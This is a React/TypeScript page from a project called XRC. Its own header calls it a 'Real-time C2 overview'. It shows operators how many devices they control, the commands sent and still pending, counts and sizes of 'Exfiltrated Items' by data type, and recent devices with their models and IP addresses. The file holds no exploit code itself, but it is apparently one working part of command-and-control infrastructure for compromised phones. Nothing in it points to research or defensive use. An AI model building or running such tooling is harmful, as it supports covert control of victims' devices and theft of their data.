// ============================================================
// FILE: XRC/dashboard/src/pages/DashboardPage.tsx
// ============================================================
import { useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import api from '@/lib/api'
import StatCard from '@/components/StatCard'
import { OnlineTimeline, CommandActivity, ExfilBreakdown } from '@/components/Charts'
import {
  Smartphone, Send, Database, Activity,
  TrendingUp, TrendingDown, Wifi, WifiOff
} from 'lucide-react'
import { motion } from 'framer-motion'

interface DashboardStats {
  totalDevices: number
  onlineDevices: number
  totalCommands: number
  pendingCommands: number
  totalExfil: number
  exfilSize: number
  commandsToday: number
  onlineTimeline: { time: string; online: number; offline: number }[]
  commandActivity: { date: string; commands: number }[]
  exfilBreakdown: { name: string; value: number; color: string }[]
  recentDevices: any[]
}

export default function DashboardPage() {
  const [stats, setStats] = useState<DashboardStats | null>(null)
  const [loading, setLoading] = useState(true)
  const navigate = useNavigate()

  useEffect(() => {
    const fetchStats = async () => {
      try {
        const res = await api.get('/dashboard/stats')
        setStats(res.data)
      } catch {
        // fallback
      }
      setLoading(false)
    }
    fetchStats()
    const interval = setInterval(fetchStats, 15000)
    return () => clearInterval(interval)
  }, [])

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="animate-spin w-8 h-8 border-2 border-xrc-cyan border-t-transparent rounded-full" />
      </div>
    )
  }

  return (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-6">
      {/* Header */}
      <div>
        <h1 className="text-2xl font-bold text-white mono">Dashboard</h1>
        <p className="text-xrc-text-muted text-sm mt-1">Real-time C2 overview</p>
      </div>

      {/* Stats row */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        <StatCard
          title="Total Devices"
          value={stats?.totalDevices ?? 0}
          icon={<Smartphone className="w-5 h-5" />}
          color="cyan"
          subtitle={`${stats?.onlineDevices ?? 0} online`}
        />
        <StatCard
          title="Commands Sent"
          value={stats?.totalCommands ?? 0}
          icon={<Send className="w-5 h-5" />}
          color="mint"
          subtitle={`${stats?.commandsToday ?? 0} today`}
          trend="up"
        />
        <StatCard
          title="Exfiltrated Items"
          value={stats?.totalExfil ?? 0}
          icon={<Database className="w-5 h-5" />}
          color="orange"
          subtitle={`${stats?.exfilSize ? (stats.exfilSize / 1024 / 1024).toFixed(1) : 0} MB total`}
        />
        <StatCard
          title="Pending Commands"
          value={stats?.pendingCommands ?? 0}
          icon={<Activity className="w-5 h-5" />}
          color={stats?.pendingCommands && stats.pendingCommands > 0 ? 'crimson' : 'mint'}
          subtitle={stats?.pendingCommands && stats.pendingCommands > 0 ? 'Requires attention' : 'All clear'}
        />
      </div>

      {/* Charts row */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="glass-card p-5">
          <h3 className="text-sm font-semibold text-white mb-4 flex items-center gap-2">
            <Activity className="w-4 h-4 text-xrc-cyan" />
            Device Activity
          </h3>
          <OnlineTimeline data={stats?.onlineTimeline ?? []} />
        </div>
        <div className="glass-card p-5">
          <h3 className="text-sm font-semibold text-white mb-4 flex items-center gap-2">
            <Send className="w-4 h-4 text-xrc-cyan" />
            Command Activity
          </h3>
          <CommandActivity data={stats?.commandActivity ?? []} />
        </div>
      </div>

      {/* Third row */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="glass-card p-5">
          <h3 className="text-sm font-semibold text-white mb-4 flex items-center gap-2">
            <Database className="w-4 h-4 text-xrc-orange" />
            Exfiltrated Data Breakdown
          </h3>
          <ExfilBreakdown data={stats?.exfilBreakdown ?? []} />
        </div>
        <div className="glass-card p-5">
          <h3 className="text-sm font-semibold text-white mb-4 flex items-center gap-2">
            <Smartphone className="w-4 h-4 text-xrc-cyan" />
            Recent Devices
          </h3>
          <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
            {(stats?.recentDevices ?? []).length === 0 ? (
              <p className="text-xrc-text-muted text-sm text-center py-8">No devices connected yet</p>
            ) : (
              stats?.recentDevices.map((d: any) => (
                <div
                  key={d.device_id}
                  className="flex items-center gap-3 p-2.5 rounded-lg hover:bg-xrc-dark/50 cursor-pointer transition-colors"
                  onClick={() => navigate(`/devices/${d.device_id}`)}
                >
                  <div className={`w-2 h-2 rounded-full ${d.is_online ? 'status-online' : 'status-offline'}`} />
                  <div className="flex-1 min-w-0">
                    <p className="text-sm text-white truncate mono">{d.alias || d.device_id.slice(0, 12)}</p>
                    <p className="text-xs text-xrc-text-muted">{d.model || 'Unknown'}</p>
                  </div>
                  <span className="text-xs text-xrc-text-muted">{d.ip_address || '-'}</span>
                </div>
              ))
            )}
          </div>
        </div>
      </div>
    </motion.div>
  )
}
